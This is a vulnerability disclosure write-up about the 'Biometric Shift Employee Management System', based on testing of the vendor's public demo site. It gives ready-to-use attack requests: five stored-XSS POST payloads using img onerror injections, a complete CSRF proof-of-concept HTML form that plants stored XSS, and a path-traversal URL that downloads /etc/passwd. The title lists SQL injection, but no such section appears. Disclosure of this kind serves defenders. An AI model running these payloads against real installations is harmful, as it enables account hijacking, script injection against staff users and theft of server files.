### Biometric Shift Employee Management System- the lastest version - SQL Injection/Stored-XSS/CSRF/Arbitrary-File-Download

Well,  when I pentest the official demo site of Biometric Shift Employee Management System, I found some vulnerabilities here.

##### Stored-XSS 

#### XSS1

```
https://www.shiftsystems.net/demo/index.php?user=ajax
```

POST parameters:

```
SavedNewEmpData=&First_Name=52pojie&Last_Name=jack'"><img src=x onerror=prompt(/xss/)><'"&Email=test2@baidu.com&Gender=male&Password=asd123&Confirm_Password=asd123&Department=6&Emp_Code=123215
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss1.png)

#### XSS2

```
https://www.shiftsystems.net/demo/index.php?user=expenses
```

POST parameters:

```
employee_id=92&expense_name=%27%22%3E%3Cimg++src%3Dx+onerror%3Dalert%28%2Fxss2%2F%29%3E%3C%27%22&expense_desc=%27%22%3E%3Cimg++src%3Dx+onerror%3Dalert%28%2Fxss3%2F%29%3E%3C%27%22&amount=123213&date=12%2F12%2F2017&submit_expense=
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss2.png)
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss3.png)

#### XSS3

```
https://www.shiftsystems.net/demo/index.php?user=addition_deduction
```

POST parameters:

```
employee_code=1235&addition_type_id=1&amount=12312%27%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%2Fxss4%2F%29%3E%3C%27%22&date=11%2F30%2F2017&submit_addition=
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss4.png)

#### XSS4

```
https://www.shiftsystems.net/demo/index.php?user=competency_criteria
```
POST parameters:

```
category=&new_category=&criteria=defds%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%2Fxss6%2F%29%3E%3C%27%22&target_score=45&edit_criteria_id=1&edit_criteria=
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss5.png)

#### XSS5

```
https://www.shiftsystems.net/demo/index.php?user=edit_holiday&editid=x
```
POST parameters:

```
------WebKitFormBoundary52ESQlr0AU5OCjNc
Content-Disposition: form-data; name="holiday_name"

Holiday123'"><img src=x onerror=alert(7)><'"
```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss5.png)



#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.shiftsystems.net/demo/index.php?user=edit_holiday&editid=1" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="setting&#95;ip" value="63892f9e5aa65f3adfaaf5a8e687507f5bdd7f218a71b3653ea84ad78752c0fcd9957622a18fc2e149675457d4f71df9b47242b13cfc624a0491d744da8aa3877d40a804eabd6c852abe72bb79a851e9a3d4c951d3945ca8be78d9901c81515d1d6e64d4f18943b8b25992d3c3bc4f19a5b0fde3c029ee79f4b3bc9c7553a92e0b5a6ffe875c56ae123e2961645949d5be0b9f16172&#46;96&#46;196&#46;108ChromeWindows&#32;10" />
      <input type="hidden" name="holiday&#95;name" value="Holiday123&apos;&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;&#47;xss7&#47;&#41;&gt;&lt;&apos;&quot;" />
      <input type="hidden" name="date&#95;from" value="07&#45;09&#45;2017" />
      <input type="hidden" name="date&#95;to" value="23&#45;09&#45;2017" />
      <input type="hidden" name="description" value="suddnly&#32;My&#32;&#32;mom&#32;Is&#32;hospitelized&#32;So&#32;" />
      <input type="hidden" name="update&#95;holiday" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

This vulnerability does not need evil attacker to login into the user panel.


#### Arbitrary-File-Download

Weak link here:
```
https://www.shiftsystems.net/demo/index.php?user=download_form&form_file_name=../../../../../../../../../../../etc/passwd
```

Well, you can see,  we've download the passwd file now！

```
![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/download.png)
```